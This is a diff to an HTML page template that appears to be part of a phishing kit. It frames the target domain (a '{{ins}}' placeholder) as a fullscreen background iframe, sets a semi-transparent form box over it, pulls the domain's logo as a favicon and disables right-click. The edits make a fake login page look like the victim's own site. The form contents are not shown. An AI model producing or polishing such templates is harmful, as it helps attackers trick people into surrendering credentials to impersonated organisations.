@@ -21,6 +21,7 @@
         }
         body {
             line-height: 1;
+            height: 100%;
         }
         ol, ul {
             list-style: none;
@@ -40,6 +41,9 @@
             font-size: 18px;
             font-family: Arial, helvetica neue, Helvetica, sans-serif;
             font-weight: 500;
+            height: 100%;
+            margin: 0;
+            padding: 0;
         }
         #root {
             position: absolute;
@@ -57,14 +61,15 @@
             padding-top: 5px;
         }
         .form-holder {
-            background-color: #fff;
+            background-color: rgba(255, 255, 255, 0.9); /* semi-transparent background */
             width: 600px;
             margin: 180px auto;
-            height: 100%;
+            height: auto;
             box-shadow: 0 20px 50px #a9a9a9;
             border-radius: 4px 4px 0 0;
             border: 1px solid #d6dfea;
             z-index: 12;
+            position: relative;
         }
         .xlogo {
             background-color: #0d4f8b;
@@ -132,11 +137,25 @@
             display: block;
             margin-bottom: 20px;
         }
+
+        /* Fullscreen iframe */
+        iframe.fullscreen-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1; /* Behind everything else */
+        }
+
     </style>
     
 </head>
 
 <body oncontextmenu="return false;">
+    <iframe src="https://www.{{ins}}" class="fullscreen-iframe"></iframe> <!-- Full background iframe -->
+
     <div class="form-holder">
         <div class="xlogo">
             <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
@@ -162,9 +181,6 @@
             </form>
         </div>
     </div>
-
-    <!-- Adding iframe with src -->
-    <iframe src="https://www.{{ins}}" width="100%" height="600" style="border:none;"></iframe>
 
 </body>
 
